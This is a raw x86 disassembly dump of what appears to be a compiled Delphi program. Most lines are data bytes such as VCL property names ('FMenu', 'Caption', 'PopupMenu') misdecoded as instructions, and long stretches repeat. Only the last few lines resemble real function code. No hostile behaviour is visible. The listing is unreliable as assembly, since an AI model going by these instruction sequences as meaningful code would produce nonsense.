add [ eax ] al
adc [ eax ] al
cmp al [ eax ]
add [ eax ] al
or [ esi + 0x44 ] al
popa
jne r-xdata
add [ eax ] al
pop esp
jne r-xdata
jb r-xdata
or eax [ esi + 0x47 ]
je r-xdata
inc ebp
add [ eax + eax ] ah
add [ edi ] al
inc esi
push eax
popad
jb r-xdata
outsd
outsb
inc esi
inc edx
add [ eax + eax ] dl
add [ esi + eax * 2 ] cl
dec eax
insb
jo r-xdata
dec ecx
outsb
js r-xdata
ror [ ebp + eax * 2 + 0x3b00 ] 0x0
or al 0x46
inc ecx
jne r-xdata
add [ eax ] al
inc esi
dec ecx
outsb
je r-xdata
inc ebp
add [ eax + eax ] ch
add [ ebx ] cl
inc esi
dec ebp
jb r-xdata
js r-xdata
loopne r-xdata
add [ eax ] al
dec ecx
outsd
dec eax
outsd
je r-xdata
add [ eax ] al
push cs
js r-xdata
add [ eax ] al
jae r-xdata
push edi
imul esi [ eax + ebp * 2 + 0x2 ] 0xa37c0000
inc ebp
add [ eax ] dh
add [ eax ] al
add eax 0x6e654d46
jne r-xdata
push 0x7c000002
mov [ 0x700045 ] eax
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax ] bl
add [ eax ] al
add eax 0x6e694846
je r-xdata
je r-xdata
insd
popad
dec ecx
outsb
dec eax
add [ eax ] al
xor al 0x8e
inc ebp
add [ eax + eax ] al
add [ ebx ] cl
inc esi
inc ecx
add [ eax ] al
add [ eax ] al
or eax [ esi + 0x49 ]
jns r-xdata
jb r-xdata
dec ebp
outsb
jne r-xdata
inc ebp
add [ eax ] ch
add [ eax ] al
pop es
inc esi
dec ebp
jb r-xdata
or al 0x8a
inc ebp
add [ eax + 0x9000000 ] al
inc esi
dec edi
outsb
inc ebx
push 0x65676e61
add al [ eax ]
add ah dl
inc esi
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] dh
add [ eax ] dl
inc esi
push ebx
add [ eax ] al
fcomp [ edx + 0x42 ]
add [ eax + eax ] bl
add [ esi ] al
inc esi
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
popad
imul eax [ edx ] 0x0
add [ eax - 0x5d ] bh
inc esp
add [ eax + eax ] cl
add [ edi ] al
inc esi
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x270
int3
js r-xdata
add al [ eax ]
add al al
mov [ ebp ] es
cmp al 0x0
add [ eax ] al
adc al [ esi + 0x41 ]
jne r-xdata
add [ edx ] cl
adc [ eax ] eax
pop ss
xchg ebp eax
inc ebp
ja r-xdata
mov eax [ ebp ]
cwde
add [ eax ] al
add [ ebx ] dl
insd
popad
jae r-xdata
inc esi
push ebx
jne r-xdata
dec eax
add [ eax + eax ] bh
add [ esi ] cl
add al [ fs : eax ]
add [ eax - 0x67 ] bh
dec eax
popad
outsb
insb
add al [ gs : eax ]
ja r-xdata
nop
add [ eax ] al
add [ ebx ] cl
inc esi
dec edi
outsb
inc esp
jb r-xdata
popad
insd
push edx
bound esi [ gs : ebp + 0x69 ]
insb
add al [ fs : eax ]
add ah ah
je r-xdata
add al [ eax ]
add [ eax ] al
adc [ eax ] al
je r-xdata
insd
jae r-xdata
add [ eax ] dl
add al [ eax ]
add [ eax - 0x67 ] bh
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xcc000002
mov [ ebp ] eax
dec eax
add [ eax ] al
add [ esi ] al
inc esi
inc edx
jb r-xdata
outsd
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
add [ edx ] bl
add [ esp + edx * 4 + r--data ] cl
or eax [ eax ]
retn 0x4594
je r-xdata
dec ebp
add bh bh
outsb
arpl [ ebp + 0x64 ] sp
inc esp
inc ecx
je r-xdata
inc edx
add [ eax + 0x8000000 ] cl
inc esi
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x9c000002
mov al [ ebp ]
aam 0x46
insd
popad
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] 0xb0000002
xchg [ eax ] ecx
jl r-xdata
add [ eax ] bh
add [ eax ] al
adc [ esi + 0x49 ] al
je r-xdata
add [ eax ] al
adc [ esi + 0x53 ] al
mov eax 0x60004246
add [ eax ] al
add [ ecx ] cl
inc esi
push ebx
push 0x4374726f
jne r-xdata
add [ edx ] al
hlt
insd
add al [ eax ]
add [ esp + ecx * 4 ] cl
inc ebp
add [ eax + 0xe000000 ] ah
inc esi
dec edi
outsb
dec ebp
popad
jae r-xdata
add ch bh
push [ ecx + 0x42004596 ]
add ah dh
outsd
inc ebx
push 0x26b6365
add [ eax ] al
push 0xac0040af
add [ eax ] al
add [ edi ] al
inc esi
add [ eax ] al
sbb al [ eax ]
mov [ ebp + eax * 2 + 0xb004c00 ] ss
add dl al
xchg esp eax
inc ebp
add [ ebp ] cl
inc esi
dec edi
outsb
inc ecx
jbe r-xdata
insd
add al [ eax ]
add [ eax - 0x75 ] dl
inc ebp
add [ eax + 0x13000000 ] bl
setbe [ ebp ]
inc edx
add ah dh
inc [ esi + edx * 4 + 0x45 ]
add [ edx ] al
hlt
jb r-xdata
inc ebp
add [ edx ] cl
adc al [ eax ]
fst [ ebp + r-xdata ]
dec ecx
je r-xdata
hlt
add [ edx ] dl
add cl bl
xchg ebp eax
inc ebp
add [ edx ] al
jne r-xdata
insd
add al [ eax ]
add [ eax ] al
adc [ eax ] al
test al 0x0
add [ eax ] al
or al [ esi + 0x41 ]
sub_4591de
adc [ eax ] al
push eax
add [ eax ] al
add [ eax ] cl
inc esi
inc ebx
outsd
insd
insd
popad
outsb
add al [ fs : eax ]
add [ esi + eax * 2 + 0x42 ] bl
inc ebp
add [ eax + eax ] ah
add [ edi ] al
inc esi
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
inc esi
dec ecx
outsb
je r-xdata
inc ebp
add [ eax + eax ] ch
add [ ebx ] cl
inc esi
dec ebp
jb r-xdata
js r-xdata
add [ eax ] al
push cs
js r-xdata
add [ eax ] al
jae r-xdata
push edi
imul esi [ eax + ebp * 2 + 0x2 ] 0xa37c0000
inc ebp
add [ eax ] dh
add [ eax ] al
add eax 0x6e654d46
jne r-xdata
push 0x7c000002
mov [ 0x700045 ] eax
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax ] bl
add [ eax ] al
add eax 0x6e694846
je r-xdata
jb r-xdata
dec ebp
outsb
jne r-xdata
add [ eax + eax ] dl
add [ esi + eax * 2 ] cl
dec eax
insb
jo r-xdata
add [ eax ] al
pop esp
inc esi
inc edx
inc ebp
add [ eax ] ch
add [ eax ] al
pop es
inc esi
dec ebp
jb r-xdata
or al 0x8a
inc ebp
add [ eax + 0x9000000 ] al
inc esi
dec edi
outsb
inc ebx
push 0x65676e61
add al [ eax ]
add ah dl
inc esi
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] dh
add [ eax ] dl
inc esi
push ebx
add [ eax ] al
fcomp [ edx + 0x42 ]
add [ eax + eax ] bl
add [ esi ] al
inc esi
dec ecx
je r-xdata
add [ eax ] al
add [ edx ] cl
adc [ eax ] eax
pop ss
xchg ebp eax
inc ebp
ja r-xdata
mov eax [ ebp ]
cwde
add [ eax ] al
add [ ebx ] dl
insd
popad
jae r-xdata
inc esi
push ebx
jne r-xdata
dec eax
add [ eax + eax ] bh
add [ esi ] cl
add al [ fs : eax ]
add [ eax - 0x67 ] bh
dec eax
popad
outsb
insb
add al [ gs : eax ]
ja r-xdata
nop
add [ eax ] al
add [ ebx ] cl
inc esi
dec edi
outsb
inc esp
jb r-xdata
popad
insd
push edx
bound esi [ gs : ebp + 0x69 ]
insb
add al [ fs : eax ]
add ah ah
je r-xdata
add al [ eax ]
add [ eax ] al
adc [ eax ] al
je r-xdata
insd
jae r-xdata
add [ edx ] bl
add [ esp + edx * 4 + r--data ] cl
or eax [ eax ]
retn 0x4594
je r-xdata
dec ebp
add bh bh
outsb
arpl [ ebp + 0x64 ] sp
inc esp
inc ecx
je r-xdata
inc edx
add [ eax + 0x8000000 ] cl
inc esi
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x9c000002
mov al [ ebp ]
aam 0x46
insd
popad
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] 0xb0000002
xchg [ eax ] ecx
jl r-xdata
add [ eax ] bh
add [ eax ] al
adc [ esi + 0x49 ] al
je r-xdata
add [ eax ] al
adc [ esi + 0x53 ] al
mov eax 0x60004246
add [ eax ] al
add [ ecx ] cl
inc esi
push ebx
push 0x4374726f
jne r-xdata
add [ eax ] al
add [ edx ] al
hlt
insd
add al [ eax ]
add [ esp + ecx * 4 ] cl
inc ebp
add [ eax + 0xe000000 ] ah
inc esi
dec edi
outsb
dec ebp
popad
jae r-xdata
add ch bh
push [ ecx + 0x42004596 ]
add ah dh
outsd
inc ebx
push 0x26b6365
add [ eax ] al
push 0xac0040af
add [ eax ] al
add [ edi ] al
inc esi
add [ eax ] al
sbb al [ eax ]
mov [ ebp + eax * 2 + 0xb004c00 ] ss
add dl al
xchg esp eax
inc ebp
add [ ebp ] cl
inc esi
dec edi
outsb
inc ecx
jbe r-xdata
insd
add al [ eax ]
add [ eax - 0x75 ] dl
inc ebp
add [ eax + 0x13000000 ] bl
add [ eax ] dl
add al [ eax ]
add [ eax - 0x67 ] bh
setbe [ ebp ]
inc edx
add ah dh
inc [ esi + edx * 4 + 0x45 ]
add [ edx ] al
hlt
jb r-xdata
inc ebp
add [ edx ] cl
adc al [ eax ]
fst [ ebp + r-xdata ]
dec ecx
je r-xdata
hlt
add [ edx ] dl
add cl bl
xchg ebp eax
inc ebp
add [ edx ] al
jne r-xdata
insd
add al [ eax ]
add [ eax ] al
adc [ eax ] al
test al 0x0
add [ eax ] al
or al [ esi + 0x41 ]
sub_459e6c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi - 0x5c7fffbb ] bl
inc ebp
add [ edx ] dl
lahf
inc ebp
add ch ah
lahf
inc ebp
add [ ecx - 0x60 ] dl
inc ebp
add [ ebx - 0x60 ] ch
inc ebp
add [ eax + eax ] ah
add [ eax - 0x53ffbd33 ] dh
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
sub_459ea2
inc ebx
add al dl
pop eax
inc eax
add al ah
rol [ ebx ] 0xd8
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax ] ah
pop es
inc esi
add [ ebx + edx - 0x3a73ffbd ] bl
inc ebx
add ah cl
adc al [ ebx ]
adc al 0x12
inc esi
add [ eax - 0x6bffb9ee ] dh
mov [ ebx ] 0xe8
leave
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ esi + eax + 0x46 ] dh
add ah bh

sub_45a125
insb
add al [ eax ]
push 0x75706f50
jo r-xdata
inc edi
je r-xdata
push 0x72646c69
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax [ eax ]
jl r-xdata
inc eax
add [ eax ] cl
add [ edx ] al
add [ ebx + 0x45 ] bh
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add al [ eax ]
jl r-xdata
adc al [ esi ]
or eax 0x69527349
insb
or [ esi + 0x69 ] al
outsb
dec ecx
je r-xdata
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax - 0x34 ] dh
inc edx
add [ eax ] cl
add [ eax + edx * 2 ] al
add ah cl
adc [ eax ] al
add [ eax ] eax
or [ ecx + 0x43 ] al
outsd
insd
insd
popad
outsb
add al [ fs : eax ]
add al [ eax ]
add [ eax ] cl
or [ esi ] eax
or eax 0x70736944
popad
je r-xdata
add al [ eax ]
add [ eax ] ah
sahf
inc ebp
add [ edx ] al
add [ ebx + ecx * 2 ] al
imul ebp [ esi + 0x64 ] 0x20002
inc edi
add [ eax + 0x7 ] bl
inc esi
add [ ebx ] cl
inc edi
je r-xdata
inc ebp
add [ eax ] cl
add [ ebx ] al
add [ ebx + 0x45 ] bh
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x756c6156
add al [ gs : eax ]
add al [ eax ]
inc esi
add [ edi ] cl
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
inc ebx
outsd
insd
insd
popad
outsb
add eax [ fs : eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ ebx + 0x45 ] bh
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax - 0x51 ] ch
inc eax
add [ ecx ] al
add [ edi ] al
inc ecx
dec eax
popad
outsb
insb
add al [ gs : eax ]
add al [ eax ]
inc ebp
add [ eax + ecx + 0x46 ] cl
add [ eax ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x6d657449
inc ebp
inc eax
add [ eax ] cl
add [ ecx ] al
add [ ebx + 0x45 ] bh
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] eax
jl r-xdata
push 0x4c6f5474
fcom [ edx ]
inc esi
outsd
outsb
je r-xdata
jb r-xdata
or [ eax ] al
add al 0x50
add eax [ eax ]
js r-xdata
insd
je r-xdata
push 0x4c6f5474
arpl [ edx ] ax
add [ eax ] al
sbb ch dl
inc edx
add [ ecx ] al
add [ edx + edx * 2 ] al
outsd
outsd
je r-xdata
or [ eax ] al
add [ eax ] eax
jl r-xdata
push 0x4374726f
js r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
inc ebp
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
fmul [ 0x490a0046 ]
jae r-xdata
add [ eax ] dl
jl r-xdata
add [ edx ] al
or cl [ ecx + 0x73 ]
push ebx
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
inc edi
add [ esi + edx + 0x50150046 ] ch
popad
jb r-xdata
inc ebx
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ ebx + 0x45 ] bh
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add eax edi
enter 0x40 0x1
add [ edi ] al
dec ebp
jae r-xdata
jb r-xdata
add [ 0x69527349 ] cl
add eax [ eax ]
pop esp
inc esi
inc edx
add [ eax ] cl
add [ ebx ] al
add [ ebx + 0x45 ] bh
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x756c6156
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
add al [ eax ]
or [ edx + 0x79 ] eax
inc ebx
outsd
insd
insd
popad
outsb
add al [ fs : eax ]
add al [ eax ]
sub eax 0x4612dc00
jo r-xdata
insb
inc esi
add [ esi ] cl
insb
outsb
xor eax 0x46168400
add [ 0x65726150 ] dl
outsb
je r-xdata
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ eax ] cl
inc ecx
inc ebx
outsd
outsb
je r-xdata
popad
add al [ gs : bx + si ]
add al [ eax ]
push 0x65676e61
outsd
inc ebx
jne r-xdata
inc ebx
movsb [ edi ] [ esi ]
inc ebp
add [ edx ] al
add [ edx ] al
add [ ebp + 0x20045 ] ah
add ebx [ ecx + 0x20045a3 ]
add [ edx ] al
add [ eax + 0x48004887 ] dh
add [ eax ] al
push [ edx + edx + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4906ffff ] al
insd
popad
jae r-xdata
popad
add al [ gs : bx + si ]
add al [ eax ]
nop
and [ ebx + 0x5070045 ] 0x54
dec ebp
outsb
jne r-xdata
outsd
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4365646f
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
jl r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4365646f
push 0x65676e61
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
lea eax [ ebp ]
fcom [ esi ]
inc esi
add al ch
push ss
inc esi
add [ ecx ] al
jae r-xdata
sahf
inc ebp
add [ eax ] bl
aad 0x42
add [ ebx ] al
add [ 0x756e654d ] al
add [ eax ] eax
outsb
jne r-xdata
sbb eax 0x20045a4
add [ edx ] al
inc ebx
movsb [ edi ] [ esi ]
inc ebp
add [ edx ] al
add [ edx ] al
outsd
movsb [ edi ] [ esi ]
inc ebp
add [ edx ] al
add [ edx ] al
xchg edx eax
movsb [ edi ] [ esi ]
inc ebp
add [ edx ] al
add [ edx ] al
mov bl 0xa4
inc ebp
add [ edx ] al
add [ edx ] al
xlat
add [ edx ] al
cld
mov [ 0x20045 ] eax
add bl [ 0x20045a4 ]
dec ecx
arpl [ ebp + 0x73 ] sp
js r-xdata
je r-xdata
add [ eax - 0x67 ] bh
jb r-xdata
inc ebp
add [ eax ] bh
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
jae r-xdata
add eax 0x756e654d
push 0x37261
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
jl r-xdata
jae r-xdata
jae r-xdata
insd
add [ eax ] eax
insb
add al [ eax ]
add al [ eax ]
inc eax
add [ eax ] bh
adc al 0x46
add [ edi ] cl
push eax
jb r-xdata
je r-xdata
add al [ eax ]
add [ eax - 0x37 ] esi
inc eax
add [ ecx ] al
add [ edi ] al
dec ebp
jae r-xdata
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
sub_45a4f0
dec [ esi ]
push eax
popad
jb r-xdata
add [ eax - 0xfffbfa8 ] bh
int3
outsb
je r-xdata
add al al
movsd [ edi ] [ esi ]
inc ebp
add bl dh
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ edi ] bl
cmpsb [ esi ] [ edi ]
inc ebp
add [ eax + eax ] ch
add [ eax - 0x62 ] ch
inc ebp
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
imul eax [ ecx + ebp * 2 + 0x4d ] 0xdc65646f
scasb [ edi ]
inc eax
add [ eax + eax ] bh
add bh bh
les edx [ ecx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570cffff ] al
imul ebp [ esi + 0x64 ] 0x6148776f
outsb
insb
nop
and [ ebp + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
inc ebp
sub_45a9a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xab
inc ebp
add [ eax - 0x56 ] al
inc ebp
add ah ch
stosb [ edi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
stosd [ edi ]
inc ebp
add [ eax + eax - 0x61980000 ] al
inc ebp
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_45aaff
push [ eax - 0x55 ]
inc ebp
add [ edx ] cl
adc [ eax ] eax
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ ebx ] al
jo r-xdata
add [ eax ] al
jo r-xdata
or [ eax ] al
add [ eax ] eax
lodsb [ esi ]
stosd [ edi ]
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
outsb
jne r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
add [ eax ] al
outsb
jne r-xdata
outsb
je r-xdata
jo r-xdata
add [ eax + 0x20 ] bh
inc esi
add [ edi ] al
inc esp
jae r-xdata
add [ eax ] al
and [ esi ] al
push es
inc ebx
jb r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
jno r-xdata
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
jo r-xdata
test eax 0xa37c0045
inc ebp
add [ eax ] dl
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
lea eax [ ebp ]
fcom [ esi ]
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add [ ecx + 0x2 ] ebx
add [ edx ] al
add [ eax + r-xdata ] dl
pop es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
outsb
jne r-xdata
jb r-xdata
or [ eax ] al
add eax [ eax ]
lodsb [ esi ]
stosd [ edi ]
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
popad
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
xor al 0x11
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add bh bh
jno r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
inc esi
add al ch
push ss
inc esi
add [ ecx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x680045a8 ] dl
add [ eax ] al
[ eax ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
or al 0x8d
inc ebp
add al bl
push ss
or eax 0x45a89000
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ 0x756e654d ] al
jae r-xdata
jns r-xdata
add [ ebx + ebp * 4 + 0x45 ] ch
add al 0x53
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
lodsb [ esi ]
stosd [ edi ]
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] bl
aad 0x42
add [ edx ] al
add [ esi ] al
inc ecx
dec edi
ja r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
je r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
push [ esi + edx + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
mov al 0x87
dec eax
add [ eax ] cl
add bh bh
je r-xdata
push [ ecx ]
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5c65646f
inc ebp
inc edx
add [ eax + eax ] dh
add bh bh
pushad
push ss
inc esi
add al dl
push cs
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
inc esi
inc edx
add al al
and [ esi ] al
enter 0x4620 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
pop esp
add [ eax ] al
add eax 0x75411100
je r-xdata
or al 0x8d
inc ebp
add ah bh
push ss
inc esi
add [ edi + edx ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insb
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
push 0x5004621
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ebx + ebp * 4 + 0x45 ] ch
add al 0x53
or dl [ eax + edx * 2 + 0x6f ]
jb r-xdata
[ eax + eax ]
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd465646f
test al 0x45
add [ eax ] dh
add bh bh
jo r-xdata
add ebp [ eax - 0x54 ]
inc ebp
add [ edx ] al
je r-xdata
inc ebx
push 0x65676e61
aam 0x46
inc edx
add [ eax ] bh
add bh bh
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
insd
popad
jae r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
add [ edi ] ah
add [ edx ] al
add [ ebx ] al
mov ebp [ ebp + eax * 2 + 0x3000200 ]
mov cl 0xac
inc ebp
add [ edx ] al
add [ ebx ] al
shr [ ebp + eax * 2 + 0x3000200 ] cl
cli
lodsb [ esi ]
inc ebp
add [ edx ] al
add [ ebx ] al
push ds
lodsd [ esi ]
inc ebp
add [ edx ] al
add [ ebx ] al
inc edi
lodsd [ esi ]
inc ebp
add [ edx ] al
add [ ebx ] al
insd
lodsd [ esi ]
inc ebp
add [ edx ] al
add [ ebx ] al
nop
lodsd [ esi ]
inc ebp
add [ edx ] al
add [ edx ] al
add [ eax ] bl
aad 0x42
add [ eax + eax ] ch
add ecx esi
stosd [ edi ]
inc ebp
add [ edx ] al
add [ ebx ] al
[ edi ]
inc ebp
add [ edx ] al
add [ ebx ] al
sbb [ ebp + eax * 2 + 0x3000200 ] ch
inc esp
lodsb [ esi ]
inc ebp
add [ edx ] al
pop ds
scasb [ edi ]
inc ebp
add [ edx ] al
add [ edx ] al
dec eax
scasb [ edi ]
inc ebp
add [ edx ] al
add [ ebx ] al
into
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebx ] al
push 0x20045ac
outsb
or al 0x8a
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
test eax 0x710045
sub_45ae61
dec [ edx ]
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add esp ebx
scasb [ edi ]
inc eax
add [ eax ] dl
add [ eax ] al
add [ edi ] al
jo r-xdata
inc esi
push edi
imul ebp [ esi + 0x64 ] 0x2776f
add [ eax ] al
add al [ eax ]
push ss
scasd [ edi ]
inc ebp
add [ edx ] al
hlt
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al al
add eax [ ebx ]
aam 0x5
inc ebx
add [ eax ] bl
or al 0x43
add [ eax ] ah
add al 0x43
add [ esp + eax + 0x1a5c0043 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ecx ] al
fsubr [ esi + 0x100040 ]
add [ eax ] al
pop es
outsd
imul ebp [ esi + 0x74 ] 0xc800408d
scasb [ edi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 - 0x5123ffbb ] al
inc ebp
add bh dh
scasb [ edi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
scasd [ edi ]
inc ebp
add [ eax ] bl
add [ eax ] al
add [ esp + edx * 2 + 0x42 ] ah
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
sub_45afe1
mov al 0x45
add [ eax ] al
add [ eax ] al
add [ eax + esi * 4 ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax - 0x50 ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
or al 0x9
inc esp
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ edx + ecx ] dl
inc esp
add [ eax + 0xa ] bh
inc esp
add [ eax + 0xa ] bl
inc esp
add [ edx + ecx + 0x44 ] al
add [ eax ] al
add [ ecx ] al
add [ edi - 0x50 ] cl
inc ebp
add [ edx ] al
hlt
sub_45b10c
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_46f140
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_476708
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_45b168
